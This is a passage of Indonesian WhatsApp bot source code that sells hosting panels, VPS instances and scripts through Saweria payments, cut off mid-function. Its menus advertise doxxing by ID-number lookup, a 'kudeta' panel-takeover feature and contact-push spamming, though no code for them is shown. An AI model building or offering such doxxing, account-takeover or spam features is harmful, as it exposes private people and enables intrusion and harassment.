if (!isOwner) return onlyOwn()
var teks = `⊑ *TOKEN & BASH 2* ⊒

*BASH INSTALL 2 :*
*${global.bash2}*

*TOKEN ALL INSTALL 2 :*
*${global.tokeninstall2}*

*TER UPDATE DARI :*
*${penghitung}*
*PUKUL :*
*${jam}*
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}),
header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${m.sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b16b6163e621449bdcecb.jpg" } }, { upload: rafatharcode.waUploadToServer }))
 }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Bash\",\"id\":\"123456789\",\"copy_code\":\"${global.bash2}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Token\",\"id\":\"123456789\",\"copy_code\":\"${global.tokeninstall2}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'linksrv1': {
if (!isOwner) return onlyOwn()
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `⊑ *LINK SRV 1* ⊒

*DOMAIN SRV1 :*
*${global.domain}*
*APIKEY SRV1 :*
*${global.apikey}*
*CAPIKEY SRV1 :*
*${global.capikey}*

*TER UPDATE DARI :*
*${penghitung}*
*PUKUL :*
*${jam}*
`
sendbutton(m.chat, teks, m)
}
break

case 'linksrv2': {
if (!isOwner) return onlyOwn()
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `⊑ *LINK SRV 2* ⊒

*DOMAIN SRV2 :*
*${global.domain2}*
*APIKEY SRV2 :*
*${global.apikey2}*
*CAPIKEY SRV2 :*
*${global.capikey2}*

*TER UPDATE DARI :*
*${penghitung}*
*PUKUL :*
*${jam}*
`
sendbutton(m.chat, teks, m)
}
break

case 'updatemenu': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *UPDATE  MENU* ⊒
┃ ${prefix}upbashinstall
┃ ${prefix}upbashinstall1
┃ ${prefix}upbashinstall2
┃ ${prefix}uptokeninstall
┃ ${prefix}uptokeninstall1
┃ ${prefix}uptokeninstall2
┃ ${prefix}updomain
┃ ${prefix}updomain2
┃ ${prefix}upapikey
┃ ${prefix}upapikey2
┃ ${prefix}upcapikey
┃ ${prefix}upcapikey2
┃ ${prefix}uphargav1
┃ ${prefix}uphargav2
┃ ${prefix}uphargav3
┃ ${prefix}uphargav3up
┃ ${prefix}uphargapribadi
┃ ${prefix}uphargav3saweria
┃ ${prefix}token-bashnew
┃ ${prefix}upzone
┃ ${prefix}upapi
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'buyotomatismenu': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *BUY OTOMATIS  MENU* ⊒
┃ ${prefix}buysc-v1
┃ ${prefix}buysc-v2
┃ ${prefix}buysc-v3
┃ ${prefix}buysc-v3up
┃ ${prefix}buysc-pribadi
┃ ${prefix}buysc-v3saweria
┃ ${prefix}depo-otomatis
┃ ${prefix}batal-membeli
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'doxxingmenu': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *DOXXING  MENU* ⊒
┃ ${prefix}doxxing *Button*
┃ ${prefix}nikparser
┃ ${prefix}getnik
┃ ${prefix}dox
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'kdtmenu': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *KUDETA  MENU* ⊒
┃ ${prefix}kudetapanel
┃ ${prefix}kudetpanel
┃ ${prefix}btlkdtpanel
┃ ${prefix}hbpanel
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'listsubdomain': 
case 'ld': {
if (!isOwner && !isJangan) return rafatharcodereply('Khusus Pengguna Reseller Subdomain RafatharCode!! Mau Liat List ? Join Reseller Subdomain RafatharCode🥵🙏')
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *LIST DOMAIN RIIBOTZZ* ⊒
┃ ${prefix}domain1 rafatharofficial.my.id 
┃ ${prefix}domain2 digital-market.me
┃ ${prefix}domain3 sellerpanell-store.xyz
┃ ${prefix}domain4 mypanell-store.com
┃ ${prefix}domain5 panelstoreku.xyz
┃ ${prefix}domain6 panel-turzz.me
┃ ${prefix}domain7 panelanimeku.my.id 
┃ ${prefix}domain8 turzcloud.tech 
┃ ${prefix}domain9 cloudxingyu.me
┃ ${prefix}domain10 xinyustore.tech 
┃ ${prefix}domain11 panel-store.games
┃ ${prefix}domain12 panelshop.live
┃ ${prefix}domain13 webhostt.my.id
┃ ${prefix}domain14 fadhostmarketplace.me 
┃ ${prefix}domain15 fadhost.tech 
┃ ${prefix}domain16 fadhostoffc.xyz  
┃ ${prefix}domain17 fadilhosting.my.id
┃ ${prefix}domain18 kebutuhanhosting.biz.id
┃ ${prefix}domain19 panelkuu.biz.id
┃ ${prefix}domain20 riooxdzz.me ( Khusus Owner )
┃ ${prefix}domain21 celiaofficial.my.id
┃ ${prefix}domain22 celiastore.my.id
┃ ${prefix}domain23 panellofficial.site
┃ ${prefix}domain24 panellofficial.my.id
┃ ${prefix}domain25 celiapanellstore.my.id
┃ ${prefix}domain26 rullz.me
┃ ${prefix}domain27 rullz.tech
┃ ${prefix}domain28 rullzpedia.com
┃ ${prefix}domain29 panell.icu
┃ ${prefix}domain30 panellstoree.com
┃ ${prefix}domain31 panelanimeku.my.id ( Khusus Owner )
┃ ${prefix}domain32 rafatharcode.me ( Khusus Owner )
┃ ${prefix}domain33 petrahosting.my.id
┃ ${prefix}domain34 moon-offc.my.id ( Khusus Owner )
┃ ${prefix}domain35 aryaelsa.tech
┃ ${prefix}domain36 zanss.xyz
┃ ${prefix}domain37 focal.us.kg
┃ ${prefix}domain38 lanamel.live
┃ ${prefix}domain39 loydzstoree.my.id
┃ ${prefix}domain40 panell-lan.my.id
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'cpanelv1menu': {

if (!isOwner && !isReseller) return rafatharcodereply('Maaf, Menu Ini Khusus Pengguna Reseller Server Private RafatharCode 1!! Mau Join ? Pm wa.me/6285864743922')
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *CPANEL V1 MENU* ⊒
┃ ${prefix}listserver
┃ ${prefix}delserver
┃ ${prefix}listuser
┃ ${prefix}deluser
┃ ${prefix}addadmin
┃ ${prefix}deladmin
┃ ${prefix}listadmin
┃ ${prefix}sramlist1
┃ ${prefix}cadmin
┃ ${prefix}1gb
┃ ${prefix}2gb
┃ ${prefix}3gb
┃ ${prefix}4gb
┃ ${prefix}5gb
┃ ${prefix}6gb
┃ ${prefix}7gb
┃ ${prefix}8gb
┃ ${prefix}9gb
┃ ${prefix}10gb
┃ ${prefix}unli
┃ ${prefix}suspend
┃ ${prefix}unsuspend
┃ ${prefix}reinstall
┃ ${prefix}linksrv1
┃ ${prefix}startsrv
┃ ${prefix}stopsrv
┃ ${prefix}restartsrv
┗━━━━━━━━━━━━━━

RiiSTORE ID V 4.0.4Support Channel`
sendbutton(m.chat, teks, m)
}
break

case 'cpanelv2menu': {

if (!isOwner && !isReseller2) return rafatharcodereply('Maaf, Menu Ini Khusus Pengguna Reseller Server Private RafatharCode 2!! Mau Join ? Pm wa.me/6285864743922')
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *CPANEL V2 MENU* ⊒
┃ ${prefix}listserver-v2
┃ ${prefix}delserver-v2
┃ ${prefix}listuser-v2
┃ ${prefix}deluser-v2
┃ ${prefix}addadmin-v2
┃ ${prefix}deladmin-v2
┃ ${prefix}listadmin-v2
┃ ${prefix}sramlist-v2
┃ ${prefix}cadmin-v2
┃ ${prefix}linksrv2
┃ ${prefix}1gb-v2
┃ ${prefix}2gb-v2
┃ ${prefix}3gb-v2
┃ ${prefix}4gb-v2
┃ ${prefix}5gb-v2
┃ ${prefix}unli-v2
┗━━━━━━━━━━━━━━

RiiSTORE ID V 4.0.4Support Channel`
sendbutton(m.chat, teks, m)
}
break

case 'bpanelmenu': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *BUY PANEL 1 OTOMATIS* ⊒
┃ ${prefix}b1gb
┃ ${prefix}b2gb
┃ ${prefix}b3gb
┃ ${prefix}b4gb
┃ ${prefix}b5gb
┃ ${prefix}bunli
┗━━━━━━━━━━━━━━
┏━ ⊑ *BUY PANEL 2 OTOMATIS* ⊒
┃
┃ ${prefix}b1gb-v2
┃ ${prefix}b2gb-v2
┃ ${prefix}b3gb-v2
┃ ${prefix}b4gb-v2
┃ ${prefix}b5gb-v2
┃ ${prefix}bunli-v2
┗━━━━━━━━━━━━━━
*NOTE JIKA SUDAH TRANSFER KIRIM BUKTI KE OWNER KAMI*`
sendbutton(m.chat, teks, m)
}
break

case 'digitalocean': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *DIGITAL  OCEAN* ⊒
┃ ${prefix}sisadroplet
┃ ${prefix}deldroplet
┃ ${prefix}cekdroplet
┃ ${prefix}listdroplet
┃ ${prefix}vps1g1c
┃ ${prefix}vps1g2c
┃ ${prefix}vps2g2c
┃ ${prefix}vps4g2c
┃ ${prefix}vps8g4c
┃ ${prefix}vps16g4c
┃ ${prefix}vps1g1c-v2 *Metode Salin*
┃ ${prefix}vps1g2c-v2 *Metode Salin*
┃ ${prefix}vps2g2c-v2 *Metode Salin*
┃ ${prefix}vps4g2c-v2 *Metode Salin*
┃ ${prefix}vps8g4c-v2 *Metode Salin*
┃ ${prefix}vps16g4c-v2 *Metode Salin*
┃ ${prefix}turnon
┃ ${prefix}turnoff
┃ ${prefix}cvpsubuntuv1 *otomatis*
┃ ${prefix}cvpsubuntuv2 *otomati*
┃ ${prefix}changeapido
┃ ${prefix}restartvps
┃ ${prefix}resetpwvps
┃ ${prefix}rebuild
┃ ${prefix}sendvps
┃ ${prefix}cvps *otomatis*
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'linode': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *LINODE* ⊒
┃ ${prefix}resetpassword
┃ ${prefix}deletelinode
┃ ${prefix}listlinode
┃ ${prefix}onlinode
┃ ${prefix}offlinode
┃ ${prefix}rebootlinode
┃ ${prefix}rebuildlinode
┃ ${prefix}sisalinode
┃ ${prefix}saldolinode
┃ ${prefix}cekvpslinode
┃ ${prefix}linode2gb
┃ ${prefix}linode4gb
┃ ${prefix}linode8gb
┃ ${prefix}linode16gb
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'installpanel': 
case 'installpanelmenu' :{

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *INSTALL PANEL* ⊒
┃ ${prefix}installpanel
┃ ${prefix}uninstallpanel
┃ ${prefix}rinstallermenuv1 *Button*
┃ ${prefix}rinstallermenuv2 *Button/Otomatis*
┃ ${prefix}rinstallermenuv3 *Button/Salin*
┃ ${prefix}createnode
┃ ${prefix}installthema
┃ ${prefix}uninstallthema
┃ ${prefix}startwings 
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'pushmenu':
case 'ngepushmenu': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *NGEPUSH  MENU* ⊒
┃ ${prefix}pushkontak
┃ ${prefix}pushkontak2
┃ ${prefix}pushkontakid
┃ ${prefix}pushkontakgc
┃ ${prefix}pushkontakidjd
┃ ${prefix}pushkontakgcjd
┃ ${prefix}savecontact
┃ ${prefix}savecontact2
┃ ${prefix}save
┃ ${prefix}cekidgc
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'topupmenu':
case 'ppobindonesia': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *PPOB  INDONESIA* ⊒
┃ ${prefix}topup-dana
┃ ${prefix}topup-gopay
┃ ${prefix}topup-ovo
┃ ${prefix}pulsa-axis
┃ ${prefix}pulsa-indosat
┃ ${prefix}pulsa-tsel
┃ ${prefix}pulsa-tri
┃ ${prefix}pulsa-xl
┃ ${prefix}tshopeepay
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'downloadmenu':
case 'donlodmenu': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *DONLOD  MENU* ⊒
┃ ${prefix}mediafire
┃ ${prefix}tiktok
┃ ${prefix}tiktok-v2
┃ ${prefix}facebook
┃ ${prefix}instagram
┃ ${prefix}twitter
┃ ${prefix}capcut
┃ ${prefix}gdrive
┃ ${prefix}mega
┃ ${prefix}tinyurl
┃ ${prefix}happymod
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'chataimenu':
case 'chataimenu': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *CHATAI  MENU* ⊒
┃ ${prefix}rafaai1
┃ ${prefix}rafaai2
┃ ${prefix}rafaai3
┃ ${prefix}rafaai4
┃ ${prefix}simi
┃ ${prefix}luminai
┃ ${prefix}min
┃ ${prefix}gptpro
┃ ${prefix}imgtext
┃ ${prefix}rafa
┃ ${prefix}bocchi
┃ ${prefix}lora
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'searchmenu':
case 'searchmenu': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *SEARCH  MENU* ⊒
┃ ${prefix}google
┃ ${prefix}gimage
┃ ${prefix}ytsearch
┃ ${prefix}rafaplay
┃ ${prefix}play
┃ ${prefix}play-v2
┃ ${prefix}ytmp4
┃ ${prefix}ytmp4-v2
┃ ${prefix}ytmp3
┃ ${prefix}ytmp3-v2
┃ ${prefix}ttsearch
┃ ${prefix}ttget
┃ ${prefix}spotifys
┃ ${prefix}pin
┗━━━━━━━━━━━━━━

RiiSTORE ID V 4.0.4 Support Channel`
sendbutton(m.chat, teks, m)
}
break

case 'othersmenu':
case 'othersmenu': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *OTHERS  MENU* ⊒
┃ ${prefix}jadibot
┃ ${prefix}stopjadibot
┃ ${prefix}listjadibot
┃ ${prefix}ceknickff
┃ ${prefix}ceknickml
┃ ${prefix}hdimg
┃ ${prefix}hdvid
┃ ${prefix}tourl
┃ ${prefix}tourl-v2
┃ ${prefix}tourl-v3
┃ ${prefix}qcstik
┃ ${prefix}qckode
┃ ${prefix}stiker
┃ ${prefix}smeme
┃ ${prefix}swm
┃ ${prefix}gtts
┃ ${prefix}gtts2
┃ ${prefix}readvo
┃ ${prefix}bukavn
┃ ${prefix}infogempa
┃ ${prefix}getvideo
┃ ${prefix}getmusic
┃ ${prefix}cekkhodam
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

// === Main Menu
case 'login':{

if (!isOwner) return reply(`khusus owner`)
if (db_saweria.length == 1) return reply(`Sudah login disaweria...`)
if (m.isGroup) return reply(`khusus di private bang`)
if (!q) return reply(`Contoh: ${prefix+command} email@gmail.com,password`)
if (!q.split("@")[1]) return reply(`Contoh: ${prefix+command} email@gmail.com,password`)
if (!q.split(".")[1]) return reply(`Contoh: ${prefix+command} email@gmail.com,password`)
if (!q.split(",")[1]) return reply(`Contoh: ${prefix+command} email@gmail.com,password`)
await reply("Sedang mencoba login...")
let Pay = new Saweria(db_saweria)
let res = await Pay.login(q.split(",")[0], q.split(",")[1])
if (!res.status) return reply(`Terjadi kesalahan saat login:\n${res.msg}`)
await sleep(500)
await reply(`*LOGIN SUKSES ✅*\n\n*USER ID:* ${res.data.user_id}`)
db_saweria.push(res.data.user_id)
fs.writeFileSync("./data/saweria.json", JSON.stringify(db_saweria))
}
break
case 'depo-otomatis':{

if (fs.existsSync("./database/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses deposit-otomatis kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal-membeli* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} 1000`)
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(q, "BUY " + q)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `乂 INFO PEMBAYARAN

- Transfer sebelum:
- ${res.data.expired_at} WIB

- ID Pembayaran: ${res.data.id}
- Total Transfer: Rp${toRupiah(res.data.amount_raw)}

NOTE:
> Kode QR hanya valid untuk 1 kali transfer.
> Jika ingin membatalkan ketik ${prefix}batal-membeli
> Setelah transfer, tunggu beberapa saat
> Jika pembayaran berhasil, status akan diperbarui otomatis.
> Untuk bantuan lebih lanjut, hubungi ${prefix}owner`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./database/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(sender, { text: `Deposit Berhasil ✅\nTotalharga: ${toRupiah(res.data.amount_raw)}\nStatus:Berhasil` })
fs.unlinkSync("./database/gateway/" + sender.split("@")[0] + ".json")
}
}
}
break
case 'batal-membeli':{

if (!fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return
rafatharcodereply("Baik Kak Transaksi Berhasil Di Batalkan ✅.")
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
}
break
case 'buysc-v1': {
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses deposit-otomatis kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal-membeli* untuk membatalkan.`)
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(rbuyscv1, "BUY " + rbuyscv1)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*乂 INFO PEMBAYARAN*

- Transfer sebelum:
- ${res.data.expired_at} WIB

- ID Pembayaran: ${res.data.id}
- Total Transfer: Rp${toRupiah(res.data.amount_raw)}

NOTE:
> Kode QR hanya valid untuk 1 kali transfer.
> Jika ingin membatalkan ketik ${prefix}batal-membeli
> Setelah transfer, tunggu beberapa saat
> Jika pembayaran berhasil, status akan diperbarui otomatis.
> Untuk bantuan lebih lanjut, hubungi ${prefix}owner`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
const baby2 = await mediafireDl('https://www.mediafire.com/file/t931ywa624mpqwl/rafanoencv1.zip/file')
rafatharcode.sendMessage(sender, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { caption: teks}, { quoted : ftext}).catch (((err) => reply('*Failed to download File*')))
m.reply(`done ga om ku?`)
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
}
}
}
break
case 'buysc-v2': {
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses deposit-otomatis kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal-membeli* untuk membatalkan.`)
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(rbuyscv2, "BUY " + rbuyscv2)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*乂 INFO PEMBAYARAN*

- Transfer sebelum:
- ${res.data.expired_at} WIB

- ID Pembayaran: ${res.data.id}
- Total Transfer: Rp${toRupiah(res.data.amount_raw)}

NOTE:
> Kode QR hanya valid untuk 1 kali transfer.
> Jika ingin membatalkan ketik ${prefix}batal-membeli
> Setelah transfer, tunggu beberapa saat
> Jika pembayaran berhasil, status akan diperbarui otomatis.
> Untuk bantuan lebih lanjut, hubungi ${prefix}owner`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
const baby2 = await mediafireDl('https://www.mediafire.com/file/713wnuucsbt5yio/rafanoencv2.zip/file')
rafatharcode.sendMessage(sender, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { caption: teks}, { quoted : ftext}).catch (((err) => reply('*Failed to download File*')))
m.reply(`done ga om ku?`)
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
}
}
}
break
case 'buysc-v3': {
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses deposit-otomatis kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal-membeli* untuk membatalkan.`)
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(rbuyscv3, "BUY " + rbuyscv3)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*乂 INFO PEMBAYARAN*

- Transfer sebelum:
- ${res.data.expired_at} WIB

- ID Pembayaran: ${res.data.id}
- Total Transfer: Rp${toRupiah(res.data.amount_raw)}

NOTE:
> Kode QR hanya valid untuk 1 kali transfer.
> Jika ingin membatalkan ketik ${prefix}batal-membeli
> Setelah transfer, tunggu beberapa saat
> Jika pembayaran berhasil, status akan diperbarui otomatis.
> Untuk bantuan lebih lanjut, hubungi ${prefix}owner`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
const baby2 = await mediafireDl('https://www.mediafire.com/file/9sruspx4a843wuv/rafanoencv3.zip/file')
rafatharcode.sendMessage(sender, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { caption: teks}, { quoted : ftext}).catch (((err) => reply('*Failed to download File*')))
m.reply(`done ga om ku?`)
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
}
}
}
break
case 'buysc-v3up': {
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses deposit-otomatis kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal-membeli* untuk membatalkan.`)
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(rbuyscv3up, "BUY " + rbuyscv3up)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*乂 INFO PEMBAYARAN*

- Transfer sebelum:
- ${res.data.expired_at} WIB

- ID Pembayaran: ${res.data.id}
- Total Transfer: Rp${toRupiah(res.data.amount_raw)}

NOTE:
> Kode QR hanya valid untuk 1 kali transfer.
> Jika ingin membatalkan ketik ${prefix}batal-membeli
> Setelah transfer, tunggu beberapa saat
> Jika pembayaran berhasil, status akan diperbarui otomatis.
> Untuk bantuan lebih lanjut, hubungi ${prefix}owner`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
const baby2 = await mediafireDl('https://www.mediafire.com/file/1g0cdxreqvtl94k/BOT+CPANEL+RAFATHAR+CODE+PRIVATE+(3).zip/file')
rafatharcode.sendMessage(sender, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { caption: teks}, { quoted : ftext}).catch (((err) => reply('*Failed to download File*')))
m.reply(`done ga om ku?`)
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
}
}
}
break
case 'buysc-v3saweria': {
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses deposit-otomatis kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal-membeli* untuk membatalkan.`)
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(rbuyscv3saweria, "BUY " + rbuyscv3saweria)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*乂 INFO PEMBAYARAN*

- Transfer sebelum:
- ${res.data.expired_at} WIB

- ID Pembayaran: ${res.data.id}
- Total Transfer: Rp${toRupiah(res.data.amount_raw)}

NOTE:
> Kode QR hanya valid untuk 1 kali transfer.
> Jika ingin membatalkan ketik ${prefix}batal-membeli
> Setelah transfer, tunggu beberapa saat
> Jika pembayaran berhasil, status akan diperbarui otomatis.
> Untuk bantuan lebih lanjut, hubungi ${prefix}owner`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
const baby2 = await mediafireDl('https://www.mediafire.com/file/1g0cdxreqvtl94k/BOT+CPANEL+RAFATHAR+CODE+PRIVATE+(3).zip/file')
rafatharcode.sendMessage(sender, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { caption: teks}, { quoted : ftext}).catch (((err) => reply('*Failed to download File*')))
m.reply(`done ga om ku?`)
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
}
}
}
break
case 'buysc-pribadi': {
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses deposit-otomatis kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal-membeli* untuk membatalkan.`)
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(rbuyscprib, "BUY " + rbuyscprib)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*乂 INFO PEMBAYARAN*

- Transfer sebelum:
- ${res.data.expired_at} WIB

- ID Pembayaran: ${res.data.id}
- Total Transfer: Rp${toRupiah(res.data.amount_raw)}

NOTE:
> Kode QR hanya valid untuk 1 kali transfer.
> Jika ingin membatalkan ketik ${prefix}batal-membeli
> Setelah transfer, tunggu beberapa saat
> Jika pembayaran berhasil, status akan diperbarui otomatis.
> Untuk bantuan lebih lanjut, hubungi ${prefix}owner`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
const baby2 = await mediafireDl('https://www.mediafire.com/file/5v8nc275nznen99/SC+PRIBADI+RAFATHARCODE.zip/file')
rafatharcode.sendMessage(sender, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { caption: teks}, { quoted : ftext}).catch (((err) => reply('*Failed to download File*')))
m.reply(`done ga om ku?`)
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
}
}
}
break
case 'b1gb':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
